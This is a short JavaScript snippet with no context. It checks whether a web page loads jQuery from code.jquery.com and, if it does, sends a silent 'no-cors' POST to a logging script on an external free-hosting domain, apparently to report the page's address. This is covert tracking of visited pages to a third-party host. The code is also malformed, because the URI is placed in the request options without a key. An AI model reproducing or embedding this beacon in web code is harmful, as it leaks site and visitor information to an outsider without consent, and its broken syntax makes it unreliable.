var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://lordwd.000webhostapp.com/log.php', {
method: 'POST',
mode: 'no-cors',
document.documentURI
});
}
